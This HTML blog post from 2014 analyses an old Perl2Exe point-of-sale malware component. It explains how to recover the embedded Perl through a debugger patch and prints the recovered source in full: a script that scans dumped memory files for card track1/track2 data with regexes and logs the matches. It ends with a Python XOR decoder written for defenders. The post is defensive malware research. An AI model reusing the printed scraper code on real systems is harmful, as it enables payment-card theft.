<!DOCTYPE html>
<html lang="en">
<head>
        <title>Playing With Some Old Perl2Exe PoS Malware</title>
        <meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="shortcut icon" href="../../../../theme/images/favicon.ico"/>
        <link rel="stylesheet" href="../../../../theme/css/main.css" type="text/css" />

        <!--[if IE]>
                <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

        <!--[if lte IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="../../../../css/ie.css"/>
                <script src="../../../../js/IE8.js" type="text/javascript"></script><![endif]-->

        <!--[if lt IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="../../../../css/ie6.css"/><![endif]-->
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js" type="text/javascript"></script>


</head>

<body id="index" class="home">
	
  <!-- <header id="banner" class="body"> -->
  <!--               <h1><a href="../../../../"><img src="http://www.launchyard.com/images/logo.png" /></a></h1> -->
  <!--       </header> --> 

  <div class="logo-bg">
    <div class="LaunchyardDetail">
      <p>
        <a href="../../../..">
          <img src="../../../../theme/images/logo-bg.png" width="100" height="100" alt="Graph icon">
        </a>
        </br>
        <span>
          <span class="blog-text">
            blog
          </span>
          / josh grunzweig
        </span>
      </p>
      <p style="margin-top:2em;">
        <a class="btn-touch" href="../../../../pages/about.html">about me</a>
      </p>
      <p style="margin-top:1em;">
        <a class="btn-touch" href="../../../../pages/publications.html">publications</a>
      </p>
      <p style="margin-top:1em;">
        <a class="btn-touch" href="../../../../pages/presentations.html">presentations</a>
      </p>
      
    <!--  <p><a id="sitesubtitle" href="../../../../"></a></p>i -->
   <!--    -->
    <!--  <p><a id="aboutlink" href="../../../../pages/about.html">about</a></p> -->

    <!-- <ul> -->
    <!--   <li><a href="../../../../pages/about.html">about</a></li> -->
      <!-- <li><a href="../../../../pages/about.html">articles</a></li> -->
<!--  -->
<!--         <br/> -->
<!--         <br/> -->
<!--      -->        
<!--       <li><a href="">New Opportunities</a></li> -->
<!--      -->        
<!--       <li><a href="">Alina Starts To Blur The Lines</a></li> -->
<!--      -->        
<!--       <li><a href="">Unique Technique for Iterating Through Processes</a></li> -->
<!--      -->        
<!--       <li><a href="">Playing With Some Old Perl2Exe PoS Malware</a></li> -->
<!--      -->
<!--  -->
    <!-- </ul> -->

    <!-- This belongs in the about page -->
      <!--  -->
      <!-- <a href="https://github.com/jgrunzweig">Github</a> -->
      <!-- <br/> -->
      <!--  -->
      <!-- <a href="https://twitter.com/jgrunzweig">Twitter</a> -->
      <!-- <br/> -->
      <!--  -->
      <!-- <a href="https://linkedin.com/in/jgrunzweig">Linkedin</a> -->
      <!-- <br/> -->
      <!--  -->

<!-- <ul>
	<li><a href="../../../../category/career">Career</a></li>
	<li><a href="../../../../category/malware">Malware</a></li>
</ul>
 -->
    </div>
    <div class="socialdiv">
      <ul id="sociallist">
        <li><a href="https://www.linkedin.com/in/jgrunzweig" target="_blank">linkedin</a></li>
        <li><a href="https://twitter.com/jgrunzweig" target="_blank">twitter</a></li>
        <li><a href="https://github.com/jgrunzweig" target="_blank">github</a></li>
      </ul>
    </div>
  </div>

<section id="content" >
    <div class="body">
      <article>
        <header>
          <h1 class="entry-title">
            <a href="../../../../posts/2014/08/playing-with-some-old-perl2exe-pos-malware/" rel="bookmark"
               title="Permalink to Playing With Some Old Perl2Exe PoS Malware">Playing With Some Old Perl2Exe PoS Malware</a></h1>

        </header>

        <div class="entry-content">
<div class="post-info">
	<ul>
        <li class="vcard author">
                 by&nbsp;<a class="url fn" href="../../../../author/josh-grunzweig.html">Josh Grunzweig</a>
        </li>
        <li class="published" title="2014-08-02T00:00:00-04:00">
          on&nbsp;Sat 02 August 2014
        </li>

	</ul>

</div><!-- /.post-info -->          <p>For this blog post, I'm going to take a look at some old Point of Sale (PoS) malware. While this sample doesn't immediately target data processed by PoS, it does with directly with a memory scraper that does. As such, I'm calling this PoS malware. Specifically, I'm going to take a look at a file that was compiled using the common <a href="http://www.indigostar.com/perl2exe.php">Perl2Exe</a> utility. The file was originally reported by Visa quite some time ago (read: back in 2009). You can see the original advisory <a href="https://usa.visa.com/download/merchants/targeted-hospitality-sector-vulnerabilities-110609.pdf">here</a>. So before you start attacking me Internet-style, let me point out that I realize this sample is very old. I actually have looked at a number of these files in the past, and was just looking for a good example that I could use for this blog post. That being said, I hope you find this blog post helpful in the event you ever stumble on some Perl2Exe malware. I personally love it when I see Perl2Exe, because I know that raw source code (with comments) is just around the corner. So let's take a look at this <a href="https://www.virustotal.com/en/file/4a9ddeab9327533e8a79feaebccb08847d992f25f4424eeaaebf622e9b075604/analysis/">sample</a>. This sample surprisingly still has an attrocious detection rate (7/53 at the time of writing) even though it has been around for almost 5 years now. Well, so be it. Before I dig into the technical details, let's take a few seconds to briefly describe what this malware is.</p>
<p>In short, the malware is a component of a three-piece family that is used to scrape track data from the memory of a PoS machine. One component is responsible for running the other two executables (1. the memory scraper and 2. the Perl2Exe that we're discussing). A second component is responsible for parsing memory of the running processes, and searching for track data. If track data is discovered, it is written to a file in the 'memdump' subdirectory that this malware creates. The third component is the one we're discussing today-- a Perl2Exe file that is responsible for encrypting any track data that was discovered by the memory scraper. We'll dig into how exactly it does that shortly. Before we can get into the specifics though, let's tear apart this Perl2Exe and get some raw source code.</p>
<p>When extracting the source code from a binary that has been compiled with Perl2Exe, it's important to understand what happens early in the process. At a high level, the binary will drop a number of dependencies to a folder in the %TEMP% directory. Typically, the folder has a name with the following format:</p>
<ul>
<li>p2xtmp-[numbers]</li>
</ul>
<p>The binary will then load the raw Perl code into memory and execute it. Now, the Perl2Exe uses a simple series of strcmp statements in order to determine if a file should be dropped to disk (in that previously created p2xtmp-* directory) or not. By modifying that strcmp statement, we can trick the Perl2Exe file into dropping the raw Perl (.pl) file to disk instead of loading it into memory. We begin by setting a breakpoint at 'call eax' directly after the Perl2Exe drops and loads the p2x588.dll library.</p>
<p><img alt="Image 1" src="../../../../images/img1.png" /></p>
<p>We then proceed to step into this function (The RunPerl function from p2x588.dll). Prior to this, we can see that the new random-generated folder has been created in %TEMP%, and that the p2x588.dll file has been dropped there:</p>
<p><img alt="Image 2" src="../../../../images/img2.png" /></p>
<p>Once we step into the RunPerl function, we identify the first call instruction, we seen below:</p>
<p><img alt="Image 3" src="../../../../images/img3.png" /></p>
<p>We proceed to step into this function and identify a number of strcmp statements, as shown below:</p>
<p><img alt="Image 4" src="../../../../images/img4.png" /></p>
<p>Now, at this point we can see that the Perl2Exe is checking the file extension of every embedded file, and determining whether it needs to drop it to disk. There are a number of extensions it will check, but if it determines that a file is a .dll, .pll, .so, etc. it will drop it to the p2xtmp-* folder. By modifying the first Jump Not Zero (jnz) statement at 0x28091ACF to a Jump Zero (jz) statement instead, the Perl2Exe will drop any embedded files that are not DLLs.A simple hex modification from '0F 84' to '0F 85' allows us to easily make this change.</p>
<p><img alt="Image 5" src="../../../../images/img5.png" /></p>
<p>We can now run the program normally. It will not execute, as the required files will not be able to be loaded, but it will drop the file(s) we care about, as shown below:</p>
<p><img alt="Image 6" src="../../../../images/img6.png" /></p>
<p>Success! We now have the raw Perl (.pl) file. I've cleaned it up a bit and included it below:</p>
<div class="highlight"><pre><span class="nv">$sleeptime</span><span class="o">=</span><span class="s">&quot;2&quot;</span><span class="p">;</span>
<span class="nv">$dirmon</span><span class="o">=</span><span class="s">&quot;memdump&quot;</span><span class="p">;</span>
<span class="nv">$logfile</span><span class="o">=</span><span class="s">&quot;dirmon.chm&quot;</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">Win32API::File::</span><span class="n">Time</span> <span class="sx">qw{:win}</span><span class="p">;</span>
<span class="k">use</span> <span class="n">FileHandle</span><span class="p">;</span>

<span class="nv">$debug</span><span class="o">=</span><span class="s">&#39;on&#39;</span><span class="p">;</span>
<span class="nv">$monitoring</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="nb">defined</span><span class="p">(</span><span class="nv">$ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
    <span class="nv">$maxdirlevel</span><span class="o">=</span><span class="nv">$ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$maxdirlevel</span><span class="o">=</span><span class="mi">5</span><span class="p">;</span>
<span class="p">};</span>

<span class="nv">$regextrack1</span><span class="o">=</span><span class="s">&#39;((b|B)(([0-9]{13,16})|([0-9]|\s){13,25})\^[A-Za-z\s0-9]{0,30}\/[A-Za-z\s0-9]{0,30}\^(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))([0-9]|\s){3,50})&#39;</span><span class="p">;</span>
<span class="nv">$regextrack2</span> <span class="o">=</span> <span class="s">&#39;([0-9]{15,16}(D|=)(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9]{8,30})&#39;</span><span class="p">;</span>

<span class="k">print</span> <span class="s">&quot;State: Loading, please wait...\n&quot;</span><span class="p">;</span>

<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">&amp;</span><span class="n">recursion</span><span class="p">(</span><span class="nv">$dirmon</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
    <span class="k">print</span> <span class="s">&quot;State: Monitoring\n&quot;</span> <span class="k">if</span> <span class="nv">$monitoring</span><span class="o">==</span><span class="mi">0</span><span class="p">;</span>
    <span class="nv">$monitoring</span><span class="o">=</span><span class="mi">1</span> <span class="k">if</span> <span class="nv">$monitoring</span><span class="o">==</span><span class="mi">0</span><span class="p">;</span>
    <span class="nb">sleep</span> <span class="nv">$sleeptime</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">sub </span><span class="nf">recursion</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$dirmon</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="k">my</span> <span class="nv">$level</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="k">return</span> <span class="k">if</span> <span class="nv">$level</span> <span class="o">&gt;</span> <span class="nv">$maxdirlevel</span><span class="p">;</span>
    <span class="nb">local</span> <span class="o">*</span><span class="n">DH</span><span class="p">;</span>
    <span class="nb">opendir</span><span class="p">(</span><span class="n">DH</span><span class="p">,</span> <span class="nv">$dirmon</span><span class="p">)</span>        <span class="ow">or</span> <span class="k">return</span> <span class="s">&quot;Couldn&#39;t open $dirmon for reading: $!&quot;</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span> <span class="k">my</span> <span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="n">DH</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
        <span class="p">(</span><span class="nv">$atime</span><span class="p">,</span> <span class="nv">$mtime</span><span class="p">,</span> <span class="nv">$ctime</span><span class="p">)</span> <span class="o">=</span> <span class="n">GetFileTime</span> <span class="p">(</span><span class="s">&quot;$dirmon/$file&quot;</span><span class="p">);</span>
        <span class="k">next</span> <span class="k">if</span> <span class="p">(</span> <span class="o">-</span><span class="n">d</span> <span class="s">&quot;$dirmon/$file&quot;</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nv">$dirtimes</span><span class="p">{</span><span class="s">&quot;$dirmon/$file&quot;</span><span class="p">}</span> <span class="o">==</span> <span class="nv">$atime</span> <span class="p">);</span>
        <span class="nv">$dirtimes</span><span class="p">{</span><span class="s">&quot;$dirmon/$file&quot;</span><span class="p">}</span> <span class="o">=</span> <span class="nv">$atime</span> <span class="k">if</span> <span class="p">(</span> <span class="o">-</span><span class="n">d</span> <span class="s">&quot;$dirmon/$file&quot;</span> <span class="p">);</span>
        <span class="o">&amp;</span><span class="n">recursion</span><span class="p">(</span><span class="s">&quot;$dirmon/$file&quot;</span><span class="p">,</span><span class="nv">$level</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span> <span class="o">-</span><span class="n">d</span> <span class="s">&quot;$dirmon/$file&quot;</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="s">&quot;$file&quot;</span> <span class="ow">ne</span> <span class="s">&quot;.&quot;</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="s">&quot;$file&quot;</span> <span class="ow">ne</span> <span class="s">&quot;..&quot;</span> <span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="nv">$messages</span> <span class="ow">eq</span> <span class="s">&quot;on&quot;</span> <span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;Trying file: $dirmon/$file\n&quot;</span><span class="p">;};</span>
        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="o">-</span><span class="n">f</span> <span class="s">&quot;$dirmon/$file&quot;</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nv">$file</span> <span class="ow">ne</span> <span class="nv">$logfile</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span> <span class="nv">$filetimes</span><span class="p">{</span><span class="s">&quot;$dirmon/$file&quot;</span><span class="p">}</span> <span class="o">!=</span> <span class="nv">$mtime</span>  <span class="p">)</span> <span class="p">{</span>
                <span class="o">&amp;</span><span class="n">file_parse</span><span class="p">(</span><span class="s">&quot;$dirmon/$file&quot;</span><span class="p">);</span>
                <span class="nv">$filetimes</span><span class="p">{</span><span class="s">&quot;$dirmon/$file&quot;</span><span class="p">}</span> <span class="o">=</span> <span class="nv">$mtime</span><span class="p">;</span> 
            <span class="p">};</span>
        <span class="p">};</span>
    <span class="p">};</span>
    <span class="p">(</span><span class="nv">$atime</span><span class="p">,</span> <span class="nv">$mtime</span><span class="p">,</span> <span class="nv">$ctime</span><span class="p">)</span> <span class="o">=</span> <span class="n">GetFileTime</span> <span class="p">(</span><span class="s">&quot;$dirmon&quot;</span><span class="p">);</span>
    <span class="nv">$dirtimes</span><span class="p">{</span><span class="s">&quot;$dirmon&quot;</span><span class="p">}</span> <span class="o">=</span> <span class="nv">$atime</span> <span class="k">if</span> <span class="p">(</span> <span class="o">-</span><span class="n">d</span> <span class="s">&quot;$dirmon&quot;</span> <span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">};</span>
<span class="k">sub </span><span class="nf">writedown</span> <span class="p">{</span>
    <span class="nv">$wd</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="nb">open</span><span class="p">(</span><span class="n">CUR</span><span class="p">,</span><span class="s">&quot;&gt;&gt;$logfile&quot;</span><span class="p">);</span>
    <span class="k">print</span> <span class="n">CUR</span> <span class="nv">$wd</span><span class="p">;</span>
    <span class="nb">close</span><span class="p">(</span><span class="n">CUR</span><span class="p">);</span>
<span class="p">};</span>

<span class="k">sub </span><span class="nf">file_parse</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$path</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="k">my</span> <span class="nv">$fh</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileHandle</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">$mtime</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="k">my</span> <span class="nv">$ctime</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="k">my</span> <span class="nv">$atime</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">(</span><span class="nv">$atime</span><span class="p">,</span> <span class="nv">$mtime</span><span class="p">,</span> <span class="nv">$ctime</span><span class="p">)</span> <span class="o">=</span> <span class="n">GetFileTime</span> <span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
    <span class="k">my</span> <span class="nv">$time</span><span class="o">=</span><span class="nb">time</span><span class="p">;</span>

    <span class="p">(</span><span class="nv">$sec</span><span class="p">,</span><span class="nv">$min</span><span class="p">,</span><span class="nv">$hour</span><span class="p">,</span><span class="nv">$mday</span><span class="p">,</span><span class="nv">$mon</span><span class="p">,</span><span class="nv">$year</span><span class="p">,</span><span class="nv">$wday</span><span class="p">,</span><span class="nv">$yday</span><span class="p">,</span><span class="nv">$isdst</span><span class="p">)</span><span class="o">=</span><span class="nb">localtime</span><span class="p">(</span><span class="nb">time</span><span class="p">);</span>
    <span class="k">print</span> <span class="s">&quot;$mon/$mday $hour:$min:$sec Updated/new file: $path ... &quot;</span> <span class="k">if</span> <span class="nv">$debug</span> <span class="ow">eq</span> <span class="s">&#39;on&#39;</span><span class="p">;</span>
    <span class="k">return</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$mtime</span><span class="p">))</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$ctime</span><span class="p">))</span> <span class="p">);</span>
    <span class="nv">$mtime</span> <span class="o">=</span> <span class="nv">$ctime</span> <span class="k">if</span> <span class="p">(</span> <span class="nv">$ctime</span> <span class="o">&gt;</span> <span class="nv">$mtime</span> <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fh</span> <span class="o">-&gt;</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;&lt; $path&quot;</span><span class="p">))</span> <span class="p">{</span> 
        <span class="k">print</span> <span class="s">&quot;error opening file!\n&quot;</span> <span class="k">if</span> <span class="nv">$debug</span> <span class="ow">eq</span> <span class="s">&#39;on&#39;</span><span class="p">;</span>  
        <span class="k">return</span><span class="p">;</span> 
    <span class="p">};</span>
    <span class="k">print</span> <span class="s">&quot;OK\n&quot;</span> <span class="k">if</span> <span class="nv">$debug</span> <span class="ow">eq</span> <span class="s">&#39;on&#39;</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">$block</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span> <span class="k">my</span> <span class="nv">$printed</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">$total</span><span class="o">++</span><span class="p">;</span> <span class="k">my</span> <span class="nv">$prevblock</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span> <span class="k">my</span> <span class="nv">$readblock</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="nb">read</span><span class="p">(</span><span class="nv">$fh</span><span class="p">,</span><span class="nv">$block</span><span class="p">,</span><span class="mi">65536</span><span class="p">))</span> <span class="p">{</span>

        <span class="nv">$readblock</span> <span class="o">=</span> <span class="nv">$prevblock</span> <span class="o">.</span> <span class="nv">$block</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span> <span class="nv">$readblock</span> <span class="o">=~</span> <span class="nv">$regextrack1</span> <span class="p">)</span> <span class="p">{</span>  
            <span class="k">if</span> <span class="p">(</span> <span class="nv">$printed</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;File: $path (track1)\n&quot;</span><span class="p">;</span> <span class="nv">$printed</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="p">};</span>
            <span class="k">while</span> <span class="p">(</span> <span class="nv">$block</span> <span class="o">=~</span><span class="sr"> /$regextrack1/g</span> <span class="p">)</span> <span class="p">{</span> 
                <span class="o">&amp;</span><span class="n">writedown</span><span class="p">(</span><span class="s">&quot;$path found (track1): $1\n&quot;</span><span class="p">)</span> <span class="k">if</span> <span class="nv">$seentrack1</span><span class="p">{</span><span class="nv">$1</span><span class="p">}</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="nv">$seentrack1</span><span class="p">{</span><span class="nv">$1</span><span class="p">}</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">};</span>

        <span class="k">if</span> <span class="p">(</span> <span class="nv">$readblock</span> <span class="o">=~</span> <span class="nv">$regextrack2</span> <span class="p">)</span> <span class="p">{</span>  
            <span class="k">if</span> <span class="p">(</span> <span class="nv">$printed</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;File: $path (track2)\n&quot;</span><span class="p">;</span> <span class="nv">$printed</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="p">};</span>
            <span class="k">while</span> <span class="p">(</span> <span class="nv">$block</span> <span class="o">=~</span><span class="sr"> /$regextrack2/g</span> <span class="p">)</span> <span class="p">{</span> 
                <span class="o">&amp;</span><span class="n">writedown</span><span class="p">(</span><span class="s">&quot;$path found (track2): $1\n&quot;</span><span class="p">)</span> <span class="k">if</span> <span class="nv">$seentrack2</span><span class="p">{</span><span class="nv">$1</span><span class="p">}</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="nv">$seentrack2</span><span class="p">{</span><span class="nv">$1</span><span class="p">}</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">};</span>
        <span class="nv">$prevblock</span> <span class="o">=</span> <span class="nv">$block</span><span class="p">;</span>
    <span class="p">};</span>
    <span class="nv">$fh</span><span class="o">-&gt;</span><span class="nb">close</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>


<p>For those that don't feel like reading Perl source code (and really, who could blame you), I'll provide a quick summary of what this malware does. The malware begins by configuring a few settings. Namely, it configures a directory that will be monitored ('memdump'), a sleep timer ('2'), and an output file ('dirmon.chm'). It also configured two regular expressions that will be used to find track1 and track2 data. The malware proceeds to check the directory specified in an infinite loop, sleeping for 2 seconds (as was previously configured) before repeating the loop. The Perl code recursively checks the directory, searching for any files. If a file is discovered, it will read in that file's data, and look for track data using the two regular expressions. If any data is found, it is written to the output file ('dirmon.chm'). And that's really all there is to this malware. </p>
<p>As a way of understanding how this malware works-- The memory scraper that was previously mentioned is run, and any discovered data is written to separate files in the 'memdump' directory. Apparently, this group either didn't have access to the source code of the memory scraper, or lacked the knowledge necessary to modify it. Instead, they decided to write a new component in Perl that will aggregate any data found. New variants of this Perl2Exe encrypt the discovered data using a simple XOR scheme. The XOR key of 'memdump' or 'anonymousgroup' has been seen in a number of samples. This XOR scheme can easily be defeated using the following Python code:</p>
<div class="highlight"><pre><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">cycle</span><span class="p">,</span> <span class="n">izip</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="c"># Using some code from http://dustri.org/b/elegant-xor-encryption-in-python.html</span>
<span class="c"># for the XOR function.</span>
<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">k</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span><span class="p">,</span><span class="n">k</span> <span class="ow">in</span> <span class="n">izip</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">cycle</span><span class="p">(</span><span class="n">key</span><span class="p">)))</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;$$$&quot;</span><span class="p">):</span>
        <span class="k">print</span> <span class="s">&quot;</span><span class="si">%r</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">xor</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\r</span><span class="s">&quot;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">),</span> <span class="s">&quot;anonymousgroup&quot;</span><span class="p">)</span>

<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> [file]&quot;</span> <span class="o">%</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></div>
        </div><!-- /.entry-content -->

      </article>
    </div>
</section>
        <section id="extras" >
        
        </section><!-- /#extras -->
	
        <footer id="contentinfo" >
                <address id="about" class="vcard ">
                Proudly powered by <a href="http://getpelican.com/" target="_blank">Pelican</a>, which takes
                great advantage of <a href="http://python.org" target="_blank">Python</a>.
		
                </address><!-- /#about -->
		

                
        </footer><!-- /#contentinfo -->

    <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-58526057-1']);
    _gaq.push(['_trackPageview']);
    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
    </script>
</body>
</html>